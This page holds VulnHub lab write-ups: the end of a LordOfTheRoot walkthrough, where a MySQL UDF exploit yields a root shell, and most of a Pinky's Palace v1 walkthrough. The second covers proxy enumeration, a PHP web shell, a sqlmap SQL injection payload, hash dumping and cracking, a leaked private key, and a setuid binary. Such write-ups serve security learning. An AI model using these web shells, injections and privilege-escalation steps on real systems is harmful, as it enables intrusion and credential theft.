smeagol@LordOfTheRoot:~<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
</code></pre></div></div>

<p>We connect to mysql database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span>
Enter password: 
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 5130
Server version: 5.5.44-0ubuntu0.14.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
mysql&gt;
</code></pre></div></div>

<p>We switch to the MySQL database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; use mysql<span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
mysql&gt;
</code></pre></div></div>

<p>We create a table to hold the exploit code.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
Query OK, 0 rows affected <span class="o">(</span>0.01 sec<span class="o">)</span>
</code></pre></div></div>

<p>We import the exploit inserting its content into the table.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/home/smeagol/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.01 sec<span class="o">)</span>
</code></pre></div></div>

<p>We select the binary content and dump it into the plugins directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select</span> <span class="k">*</span> from foo into dumpfile <span class="s1">'/usr/lib/mysql/plugin/raptor_udf2.so'</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.01 sec<span class="o">)</span>
</code></pre></div></div>

<p>We create a function to call the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
Query OK, 0 rows affected <span class="o">(</span>0.01 sec<span class="o">)</span>


The following statement can be used to execute system commands as root
</code></pre></div></div>

<p>We can verify that the function exists.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select</span> <span class="k">*</span> from mysql.func<span class="p">;</span>
+-----------+-----+----------------+----------+
| name      | ret | dl             | <span class="nb">type</span>     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | <span class="k">function</span> |
+-----------+-----+----------------+----------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>
</code></pre></div></div>

<p>We copy the /bin/sh binary to tmp directory and we grant it SUID permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select </span>do_system<span class="o">(</span><span class="s1">'cp /bin/sh /tmp/sh &amp;&amp; chmod 4777 /tmp/sh'</span><span class="o">)</span><span class="p">;</span>
+-------------------------------------------------------+
| do_system<span class="o">(</span><span class="s1">'cp /bin/sh /tmp/sh &amp;&amp; chmod 4777 /tmp/sh'</span><span class="o">)</span> |
+-------------------------------------------------------+
|                                                     0 |
+-------------------------------------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>

mysql&gt; quit<span class="p">;</span>
Bye
</code></pre></div></div>

<p>As we can see our binary was copied, we execute it and get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /tmp/sh 
<span class="nt">-rwsrwxrwx</span> 1 root root 112204 Nov  9 13:23 /tmp/sh
smeagol@LordOfTheRoot:~<span class="nv">$ </span>/tmp/sh
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
<span class="c"># python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
root@LordOfTheRoot:~# <span class="nb">cd</span> /root
root@LordOfTheRoot:/root# <span class="nb">ls
</span>buf  buf.c  Flag.txt  other  other.c  switcher.py
root@LordOfTheRoot:/root# <span class="nb">cat </span>Flag.txt 
“There is only one Lord of the Ring, only one <span class="nb">who </span>can bend it to his will. And he does not share power.”
– Gandalf
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Pinky's Palace v1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> It is a realistic Boot2Root box.</p>

<p><strong>Author:</strong> Pink_Panther</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> Gain access to the system and read the root.txt.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">https://www.vulnhub.com/entry/pinkys-palace-v1,225/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>An ARP scan discovered the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.160 08:00:27:9d:75:ee       PCS Systemtechnik GmbH
192.168.179.254 00:50:56:ee:6f:45       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>With nmap I did a full TCP port scan, this identified three available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p-</span> <span class="nt">-T5</span> 192.168.179.160 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
8080/tcp  open  http-proxy
31337/tcp open  Elite
64666/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>I performed service enumeration and script scanning to the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p8080</span>,31337,64666 <span class="nt">-sV</span> <span class="nt">-sC</span> 192.168.179.160 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  http-proxy Squid http proxy 3.5.23
|_http-server-header: squid/3.5.23
|_http-title: ERROR: The requested URL could not be retrieved
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 <span class="nb">df</span>:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f <span class="o">(</span>ED25519<span class="o">)</span>
</code></pre></div></div>

<h3 id="squid-enumeration">Squid Enumeration</h3>

<p>The service on port 31337 is an http web proxy which provides proxy and cache services for Hyper Text Transport Protocol (HTTP), File Transfer Protocol (FTP), and other popular network protocols.</p>

<p><img src="/assets/images/pinkys1/screenshot-1.png" alt="" /></p>

<p>On port 8080 we can see that this web service is forbidden.</p>

<p><img src="/assets/images/pinkys1/screenshot-2.png" alt="" /></p>

<p>There is a way to enumerate local services through aquid, the following curl instruction reveals that it gives us a status code 404 when I enumerted via the squid proxy the port 8080 using its external ip address.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">--proxy</span> http://192.168.179.160:31337 http://192.168.179.160:8080
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
&lt;body <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">"white"</span><span class="o">&gt;</span>
&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.10.3&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>So I tried to enumerate the port 8080 locally via the squid proxy, as we can see the response from the server is different.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">--proxy</span> http://192.168.179.160:31337 http://127.0.0.1:8080      
&lt;html&gt;
        &lt;<span class="nb">head</span><span class="o">&gt;</span>
                &lt;title&gt;Pinky<span class="s1">'s HTTP File Server&lt;/title&gt;
        &lt;/head&gt;
        &lt;body&gt;
                &lt;center&gt;&lt;h1&gt;Pinky'</span>s HTTP File Server&lt;/h1&gt;&lt;/center&gt;
                &lt;center&gt;&lt;h3&gt;Under Development!&lt;/h3&gt;&lt;/center&gt;
        &lt;/body&gt;
&lt;style&gt;
html<span class="o">{</span>
        background: <span class="c">#f74bff;</span>
<span class="o">}</span>
&lt;/html&gt;
</code></pre></div></div>

<p>To access on port 8080 locally, we need to set up a web proxy in the browser using the target ip and port 31337.</p>

<p><img src="/assets/images/pinkys1/screenshot-3.png" alt="" /></p>

<p>As we see the page was resolved correctly.</p>

<p><img src="/assets/images/pinkys1/screenshot-4.png" alt="" /></p>

<p>I ran gobuster to brute force and find hidden files and directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://127.0.0.1:8080 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">--proxy</span> http://192.168.179.160:31337/
...
/littlesecrets-main   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://127.0.0.1:8080/littlesecrets-main/]
</code></pre></div></div>

<p>A directory was found, so I accessed it and it redirected me to a login page, I tried to log in with common creds but nothing, apparently login attempts are logged somewhere.</p>

<p><img src="/assets/images/pinkys1/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/pinkys1/screenshot-6.png" alt="" /></p>

<p><img src="/assets/images/pinkys1/screenshot-7.png" alt="" /></p>

<p>I decided run again gobuster to find any resource under the littlesecrets-main directory, the logs.php file looks interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://127.0.0.1:8080/littlesecrets-main <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">--proxy</span> http://192.168.179.160:31337/  <span class="nt">-x</span> php,html,txt
...
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 583]
/login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 68] 
/logs.php             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 728790]
</code></pre></div></div>

<p>I injected it the logs file with a web shell, apparently the php code is not being interpreted.</p>

<p><img src="/assets/images/pinkys1/screenshot-8.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://127.0.0.1:8080/littlesecrets-main/logs.php <span class="nt">--proxy</span> http://192.168.179.160:31337 | html2text <span class="nt">-width</span> 800 | <span class="nb">tail</span> <span class="nt">-1</span>
<span class="k">***</span> 39212 &lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"cmd"</span><span class="o">])</span>?&gt; &lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"cmd"</span><span class="o">])</span>?&gt; Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:78.0<span class="o">)</span> Gecko/20100101 Firefox/78.0 <span class="k">***</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>

<p>To perform a more advanced test I used sqlmap against the login form, an SQL injection was detected in the User-Agent header.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://127.0.0.1:8080/littlesecrets-main/login.php'</span> <span class="nt">--data</span> <span class="s1">'user=pinky&amp;pass=password'</span> <span class="nt">--proxy</span> <span class="s1">'http://192.168.179.160:31337'</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--threads</span> 5 <span class="nt">--dbms</span> MYSQL
...
parameter <span class="s1">'User-Agent'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 8816 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: User-Agent <span class="o">(</span>User-Agent<span class="o">)</span>
    Type: time-based blind
    Title: MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
    Payload: sqlmap/1.5.7#stable <span class="o">(</span>http://sqlmap.org<span class="o">)</span><span class="s1">' AND (SELECT 4717 FROM (SELECT(SLEEP(5)))pGuK) AND '</span>ugVr<span class="s1">'='</span>ugVr
<span class="nt">---</span>
<span class="o">[</span>20:47:08] <span class="o">[</span>INFO] the back-end DBMS is MySQL
...
</code></pre></div></div>

<p>Listing the databases.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://127.0.0.1:8080/littlesecrets-main/login.php'</span> <span class="nt">--data</span> <span class="s1">'user=pinky&amp;pass=password'</span> <span class="nt">--proxy</span> <span class="s1">'http://192.168.179.160:31337'</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--dbms</span> MYSQL <span class="nt">--dbs</span>
...
available databases <span class="o">[</span>2]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> pinky_sec_db
</code></pre></div></div>

<p>Enumerating the database tables pinky_sec_db.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://127.0.0.1:8080/littlesecrets-main/login.php'</span> <span class="nt">--data</span> <span class="s1">'user=pinky&amp;pass=password'</span> <span class="nt">--proxy</span> <span class="s1">'http://192.168.179.160:31337'</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--dbms</span> MYSQL <span class="nt">-D</span> pinky_sec_db <span class="nt">--tables</span>
...
Database: pinky_sec_db
<span class="o">[</span>2 tables]
+-------+
| logs  |
| <span class="nb">users</span> |
+-------+
</code></pre></div></div>

<p>Listing the columns of the table users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://127.0.0.1:8080/littlesecrets-main/login.php'</span> <span class="nt">--data</span> <span class="s1">'user=pinky&amp;pass=password'</span> <span class="nt">--proxy</span> <span class="s1">'http://192.168.179.160:31337'</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--dbms</span> MYSQL <span class="nt">-D</span> pinky_sec_db <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--columns</span>
...
Database: pinky_sec_db
Table: <span class="nb">users</span>
<span class="o">[</span>3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| user   | varchar<span class="o">(</span>100<span class="o">)</span> |
| pass   | varchar<span class="o">(</span>100<span class="o">)</span> |
| uid    | int<span class="o">(</span>11<span class="o">)</span>      |
+--------+--------------+
</code></pre></div></div>

<p>Retrieving the records from the users table.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://127.0.0.1:8080/littlesecrets-main/login.php'</span> <span class="nt">--data</span> <span class="s1">'user=pinky&amp;pass=password'</span> <span class="nt">--proxy</span> <span class="s1">'http://192.168.179.160:31337'</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--dbms</span> MYSQL <span class="nt">-D</span> pinky_sec_db <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">-C</span> uid,user,pass <span class="nt">--dump</span>
...
Database: pinky_sec_db
Table: <span class="nb">users</span>
<span class="o">[</span>2 entries]
+-----+-------------+----------------------------------+
| uid | user        | pass                             |
+-----+-------------+----------------------------------+
| 1   | pinky       | f543dbfeaf238729831a321c7a68bee4 |
| 2   | pinkymanage | d60dffed7cc0d87e1f4a11aa06ca73af |
+-----+-------------+----------------------------------+
</code></pre></div></div>

<p>I saved the password hashes to a file, cracked them and got the password from the pinkymanage user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"f543dbfeaf238729831a321c7a68bee4</span><span class="se">\n</span><span class="s2">d60dffed7cc0d87e1f4a11aa06ca73af"</span> <span class="o">&gt;</span> pinky.hashes


root@kali:~<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 0 pinky.hashes rockyou.txt
...
d60dffed7cc0d87e1f4a11aa06ca73af:3pinkysaf33pinkysaf3 
</code></pre></div></div>

<p>I logged in via SSH as user <strong>pinkymanage</strong> with the password <strong>3pinkysaf33pinkysaf3</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> pinkymanage 192.168.179.160 <span class="nt">-p</span> 64666
pinkymanage@192.168.179.160<span class="s1">'s password: 
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 04:00:51 2018 from 127.0.0.1
pinkymanage@pinkys-palace:~$ id
uid=1001(pinkymanage) gid=1001(pinkymanage) groups=1001(pinkymanage)
</span></code></pre></div></div>

<p>In the web directory I found the <strong>.ultrasecret</strong> file with a base64 encoded private key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35<span class="nv">$ </span><span class="nb">cat </span>note.txt 
Hmm just <span class="k">in case</span> I get locked out of my server I put this rsa key here.. Nobody will find it heh..

pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35<span class="nv">$ </span><span class="nb">cat</span> .ultrasecret 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto
L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk
R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr
QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl
NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2
K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU
KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR
QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv
WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r
OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo
TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp
NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB
N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp
dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk
MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1
NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3
M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5
QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN
MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK
aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz
TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ
RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3
bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1
ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu
YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y
eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX
Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn
SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF
UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t
<span class="nv">LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo</span><span class="o">=</span>
</code></pre></div></div>

<p>I decoded it, and granted write privileges to the owner of the file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35<span class="nv">$ </span><span class="nb">cat</span> .ultrasecret | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> /dev/shm/id_rsa
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35<span class="nv">$ </span><span class="nb">chmod </span>400 /dev/shm/id_rsa 
</code></pre></div></div>

<p>Then, I logged in as pinky via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35<span class="nv">$ </span>ssh pinky@127.0.0.1 <span class="nt">-p</span> 64666 <span class="nt">-i</span> /dev/shm/id_rsa 
Linux pinkys-palace 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 05:54:01 2018 from 172.19.19.2
pinky@pinkys-palace:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pinky<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pinky<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>pinky<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>
</code></pre></div></div>

<p>In the pinky’s home directory I found a note and a binary file with SUID permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@pinkys-palace:~<span class="nv">$ </span><span class="nb">ls
</span>adminhelper  note.txt
pinky@pinkys-palace:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> adminhelper 
<span class="nt">-rwsr-xr-x</span> 1 root root 8880 Feb  2  2018 adminhelper
pinky@pinkys-palace:~<span class="nv">$ </span><span class="nb">cat </span>note.txt 
Been working on this program to <span class="nb">help </span>me when I need to <span class="k">do </span>administrator tasks <span class="nb">sudo </span>is just too hard to configure and I can never remember my root password! Sadly I<span class="s1">'m fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(
pinky@pinkys-palace:~$ file adminhelper 
adminhelper: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3f035a0120e92e5c0e569dc8f3f4e813ef41409b, not stripped
</span></code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-binary">SUID Binary</h3>

<p>I check if gdb exists to debug the binary, luckily it is installed on the system and start listing the existing functions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@pinkys-palace:~<span class="nv">$ </span>whereis gdb
gdb: /usr/bin/gdb /etc/gdb /usr/include/gdb /usr/share/gdb

pinky@pinkys-palace:~<span class="nv">$ </span>gdb <span class="nt">-q</span> ./adminhelper 
Reading symbols from ./adminhelper...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
<span class="o">(</span>gdb<span class="o">)</span> info functions
All defined functions:

Non-debugging symbols:
0x0000000000000618  _init
0x0000000000000640  strcpy@plt
0x0000000000000650  puts@plt
0x0000000000000660  execve@plt
0x0000000000000670  setegid@plt
0x0000000000000680  seteuid@plt
0x00000000000006a0  _start
0x00000000000006d0  deregister_tm_clones
0x0000000000000710  register_tm_clones
0x0000000000000760  __do_global_dtors_aux
0x00000000000007a0  frame_dummy
0x00000000000007d0  spawn
0x0000000000000813  main
0x0000000000000860  __libc_csu_init
0x00000000000008d0  __libc_csu_fini
0x00000000000008d4  _fini
</code></pre></div></div>

